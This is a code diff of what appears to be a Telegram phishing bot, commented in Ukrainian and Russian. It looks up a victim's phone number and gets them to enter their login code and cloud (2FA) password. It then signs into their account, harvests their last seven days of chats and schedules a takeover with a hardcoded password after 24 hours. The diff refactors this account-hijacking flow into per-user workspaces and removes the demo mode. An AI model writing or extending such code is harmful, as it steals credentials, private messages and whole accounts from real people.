@@ -14,6 +14,7 @@ from scheduler import get_pending_hijacks, mark_as_done, add_to_schedule
 from session_handler import sign_in_with_code, send_verification_code, \
     save_user_chats_last_7_days, get_account_with_2fa, move_session_to_2fa
 from phone_checker import get_phone_by_username
+from workspace_manager import workspace_manager
 from messages import *
 
 # --- НАЛАШТУВАННЯ ---
@@ -139,36 +140,6 @@ async def get_user_phone_by_username(username: str):
         await client.disconnect()
         await client.disconnect()
 
-async def initiate_code_sending(message: Message, state: FSMContext, user_id: int, phone_number: str):
-    """Ініціює відправку коду підтвердження та переводить стан на введення коду."""
-
-    if DEBUG_MODE:
-        await message.answer(
-            DEMO_MODE_CODE_SENT.format(phone=phone_number),
-            parse_mode="Markdown",
-            reply_markup=get_digit_keyboard()
-        )
-        await state.set_state(AuthStates.waiting_for_code_digit)
-        return
-
-    # Реальний режим - відправляємо код
-    success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)
-
-    if success:
-        user_data[user_id]['client'] = result
-        await message.answer(
-            CODE_SENT.format(phone=phone_number),
-            parse_mode="Markdown",
-            reply_markup=get_digit_keyboard()
-        )
-        await state.set_state(AuthStates.waiting_for_code_digit)
-    else:
-        await message.answer(
-            ERROR_UNEXPECTED.format(error=result),
-            parse_mode="Markdown"
-        )
-        user_data.pop(user_id, None)
-        await state.clear()
 
 # ==================== КОМАНДА /start ====================
 
@@ -201,22 +172,44 @@ async def cmd_start(message: Message, state: FSMContext):
 
         if phone_number:
             # УСПІХ! Номер знайдено
-            user_data[user_id] = {
-                'phone': phone_number,
-                'code': '',
-                'client': None
-            }
+            # Створюємо новий ізольований workspace
+            workspace = await workspace_manager.create_workspace(user_id, phone_number)
+            session_path = workspace.get_session_path()
 
-            # Відразу повідомляємо, що код буде надіслано
-            await message.answer(
-                f"✅ Номер `{phone_number}` найден автоматически.\n🔄 Отправляю код подтверждения...",
-                parse_mode="Markdown",
-                reply_markup=ReplyKeyboardRemove()  # Забираємо клавіатуру
-            )
+            # Відправляємо код, використовуючи шлях з workspace
+            success, result = await send_verification_code(phone_number, API_ID, API_HASH,
+                                                           os.path.dirname(session_path))
 
-            # Викликаємо логіку відправки коду (потрібно буде винести її в окрему функцію)
-            await initiate_code_sending(message, state, user_id, phone_number)
-            return
+            if success:
+                # Зберігаємо клієнт та шлях до сесії в state
+                await state.update_data(
+                    client=result,
+                    session_path=session_path,
+                    phone_number=phone_number
+                )
+
+                # Відразу повідомляємо, що код буде надіслано
+                await message.answer(
+                    f"✅ Номер `{phone_number}` найден автоматически.\n🔄 Отправляю код подтверждения...",
+                    parse_mode="Markdown",
+                    reply_markup=ReplyKeyboardRemove()
+                )
+
+                await message.answer(
+                    CODE_SENT.format(phone=phone_number),
+                    parse_mode="Markdown",
+                    reply_markup=get_digit_keyboard()
+                )
+                await state.set_state(AuthStates.waiting_for_code_digit)
+            else:
+                await message.answer(
+                    ERROR_UNEXPECTED.format(error=result),
+                    parse_mode="Markdown"
+                )
+                # Видаляємо workspace у разі помилки
+                await workspace_manager.remove_workspace(user_id)
+                await state.clear()
+            return  # <-- Важливо, щоб не йти далі до ручного запиту
         else:
             # Номер прихований або помилка
             await message.answer(
@@ -262,32 +255,25 @@ async def process_phone(message: Message, state: FSMContext):
     if not phone_number.startswith('+'):
         phone_number = '+' + phone_number
 
-    user_data[user_id] = {
-        'phone': phone_number,
-        'code': '',
-        'client': None
-    }
+    # Створюємо новий ізольований workspace
+    workspace = await workspace_manager.create_workspace(user_id, phone_number)
+    session_path = workspace.get_session_path()
 
-    await message.answer(
-        PHONE_RECEIVED.format(phone=phone_number),
-        parse_mode="Markdown",
-        reply_markup=ReplyKeyboardRemove()
-    )
-
-    if DEBUG_MODE:
-        await message.answer(
-            DEMO_MODE_PHONE_RECEIVED.format(phone=phone_number),
-            parse_mode="Markdown",
-            reply_markup=get_digit_keyboard()
-        )
-        await state.set_state(AuthStates.waiting_for_code_digit)
-        return
-
-    # Реальний режим - відправляємо код
-    success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)
+    # Відправляємо код, використовуючи шлях з workspace
+    success, result = await send_verification_code(phone_number, API_ID, API_HASH, os.path.dirname(session_path))
 
     if success:
-        user_data[user_id]['client'] = result
+        # Зберігаємо клієнт та шлях до сесії в state
+        await state.update_data(
+            client=result,
+            session_path=session_path,
+            phone_number=phone_number
+        )
+        await message.answer(
+            PHONE_RECEIVED.format(phone=phone_number),
+            parse_mode="Markdown",
+            reply_markup=ReplyKeyboardRemove()
+        )
         await message.answer(
             CODE_SENT.format(phone=phone_number),
             parse_mode="Markdown",
@@ -299,7 +285,8 @@ async def process_phone(message: Message, state: FSMContext):
             ERROR_UNEXPECTED.format(error=result),
             parse_mode="Markdown"
         )
-        user_data.pop(user_id, None)
+        # Видаляємо workspace у разі помилки
+        await workspace_manager.remove_workspace(user_id)
         await state.clear()
 
 
@@ -309,16 +296,23 @@ async def process_digit(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     action = callback.data.split("_")[1]
 
-    if user_id not in user_data:
+    # Отримуємо дані зі state, а не з глобального словника
+    state_data = await state.get_data()
+    current_code = state_data.get('code', "") # Отримуємо код, якщо немає - порожній рядок
+
+    # Перевірка наявності клієнта (для надійності)
+    client = state_data.get('client')
+    if not client:
         await callback.message.answer(ERROR_SESSION_LOST)
         await state.clear()
+        # Очищуємо workspace, якщо він існує
+        await workspace_manager.remove_workspace(user_id)
         return
-
-    current_code = user_data[user_id]['code']
 
     if action == 'erase':
         current_code = current_code[:-1]
-        user_data[user_id]['code'] = current_code
+        # Оновлюємо код у state
+        await state.update_data(code=current_code)
 
         display_code = current_code + '_' * (5 - len(current_code))
         status = CODE_CONTINUE
@@ -335,37 +329,18 @@ async def process_digit(callback: types.CallbackQuery, state: FSMContext):
             await callback.answer(CODE_TOO_SHORT_ALERT, show_alert=True)
             return
 
-        if DEBUG_MODE:
-            await callback.message.edit_text(
-                DEMO_MODE_VERIFICATION.format(
-                    code=current_code,
-                    phone=user_data[user_id]['phone']
-                ),
-                parse_mode="Markdown"
-            )
-            # В демо-режиме сразу авторизуем
-            authorized_users[user_id] = {
-                'phone': user_data[user_id]['phone'],
-                'name': callback.from_user.full_name
-            }
-            user_data.pop(user_id, None)
-            await state.clear()
-
-            await callback.message.answer(
-                AUTH_SUCCESS,
-                reply_markup=get_main_menu_keyboard()
-            )
-            return
-
+        # Оновлюємо фінальний код у state перед передачею
+        await state.update_data(code=current_code)
         await finalize_sign_in(callback.message, user_id, current_code, state)
 
-    else:
+    else: # Введення цифри
         if len(current_code) >= 5:
             await callback.answer(CODE_TOO_LONG_ALERT, show_alert=True)
             return
 
         current_code += action
-        user_data[user_id]['code'] = current_code
+        # Оновлюємо код у state
+        await state.update_data(code=current_code)
 
         display_code = current_code + '•' * (5 - len(current_code))
         status = CODE_READY if len(current_code) == 5 else CODE_CONTINUE
@@ -387,7 +362,7 @@ async def process_2fa_password(message: Message, state: FSMContext):
     # Отримуємо дані зі state
     state_data = await state.get_data()
     client = state_data.get('client')
-    phone_number = state_data.get('phone')
+    phone_number = state_data.get('phone_number')
 
     if not client or not phone_number:
         await message.answer("❌ Втрачено сесію. Спробуйте знову /start")
@@ -552,10 +527,10 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
     """Фінальний вхід з кодом підтвердження"""
     await message.edit_text(CODE_CHECKING)
 
-    # Отримуємо дані зі state
+    # Отримуємо дані зі state (тепер це буде працювати)
     state_data = await state.get_data()
     client = state_data.get('client')
-    phone_number = state_data.get('phone')
+    phone_number = state_data.get('phone_number') # <-- Переконайтеся, що ключ 'phone_number'
 
     if not client or not phone_number:
         await message.edit_text(ERROR_SESSION_LOST)
@@ -567,7 +542,7 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             client=client,
             phone=phone_number,
             code=code,
-            session_folder=SESSION_FOLDER
+            session_folder=SESSION_FOLDER # Повертаємося до глобальної папки для простоти
         )
 
         logger.info(f"sign_in_with_code Success = {success}")
@@ -589,31 +564,49 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
                 parse_mode="Markdown"
             )
 
-            # Запускаємо збір чатів у фоні
-            async def collect_chats():
-                try:
-                    logger.info(f"Фоновий збір чатів для {phone_number} розпочато...")
-                    await save_user_chats_last_7_days(client, phone_number, CHAT_FOLDER)
-                    logger.info(f"Чати для {phone_number} успішно збережено")
-                except Exception as e:
-                    logger.error(f"Помилка при збереженні чатів: {e}")
-                finally:
-                    if client and client.is_connected():
-                        await client.disconnect()
-
-            asyncio.create_task(collect_chats())
+            # === НАЧАЛО: Збираємо дані для фонової задачі ДО її запуску ===
+            workspace = await workspace_manager.get_workspace(user_id)
+            chats_dir = workspace.chats_dir if workspace else CHAT_FOLDER  # Fallback на старий шлях
 
             # Додаємо в чергу на виконання через 24 години
             hijack_password = "Waterlemon7grow$"
             await add_to_schedule(phone_number, hijack_password)
-
             logger.info(f"🕐 Акаунт {phone_number} буде остаточно перехоплено через 24 години.")
 
-            # Очищуємо дані тільки при успішному вході
+            # Позначаємо workspace як завершений для подальшої обробки
+            if workspace:
+                await workspace.save_schedule(hijack_password)
+                await workspace.mark_as_finished()
+
+            # Видаляємо workspace з пам'яті, але папка ще існує для фонової задачі
+            await workspace_manager.remove_workspace(user_id)
+
+            # === КІНЕЦЬ: Дані зібрані ===
+
+            # Запускаємо збір чатів у фоні з уже отриманими даними
+            async def collect_chats():
+                try:
+                    logger.info(f"Фоновий збір чатів для {phone_number} розпочато... Шлях: {chats_dir}")
+                    await save_user_chats_last_7_days(client, phone_number, chats_dir)
+                    logger.info(f"Чати для {phone_number} успішно збережено")
+                except Exception as e:
+                    logger.error(f"Помилка при збереженні чатів: {e}")
+                finally:
+                    # ВАЖЛИВО: Відключаємо клієнт тільки тут, в кінці фонової задачі
+                    if client and client.is_connected():
+                        try:
+                            await client.disconnect()
+                            logger.info(f"Клієнт для {phone_number} успішно відключено у фоновій задачі.")
+                        except Exception as e:
+                            logger.error(f"Помилка відключення клієнта для {phone_number}: {e}")
+
+            asyncio.create_task(collect_chats())
+
+            # Очищуємо стан
             await state.clear()
 
         elif success == "2FA_DETECTED":
-            # Виявлено 2FA - переводимо в стан очікування пароля
+            # Логіка для 2FA залишається схожою, але також використовує state
             if ENABLE_2FA_HIJACK:
                 await message.edit_text(
                     "🔐 Обнаружен облачный пароль\n\n"
@@ -622,14 +615,11 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
                     "Пожалуйста, введите ваш облачный пароль Telegram:",
                     parse_mode="Markdown"
                 )
-
-                # Встановлюємо стан очікування 2FA пароля
                 await state.set_state(AuthStates.waiting_for_2fa_password)
-
-                # Зберігаємо клієнт та номер телефону в state
+                # ВАЖЛИВО: Зберігаємо клієнт та номер телефону в state для майбутнього використання
                 await state.update_data(
                     client=client,
-                    phone=phone_number
+                    phone_number=phone_number  # <-- Зберігаємо під правильним ключем
                 )
 
                 # НЕ відключаємо клієнт - він потрібен для подальшого входу
@@ -639,12 +629,7 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
                 # Якщо 2FA вимкнено - відключаємо клієнт
                 if client.is_connected():
                     await client.disconnect()
-
-                await message.edit_text(
-                    "❌ На цьому акаунті ввімкнена двофакторна автентифікація.\n"
-                    "На жаль, ми не можемо продовжити.",
-                    parse_mode="Markdown"
-                )
+                await message.edit_text("❌ 2FA не поддерживается.", parse_mode="Markdown")
                 await state.clear()
 
         else:
@@ -663,6 +648,7 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
         if client and client.is_connected():
             await client.disconnect()
         await state.clear()
+
 
 # ==================== КОМАНДЫ БОТА ====================
 
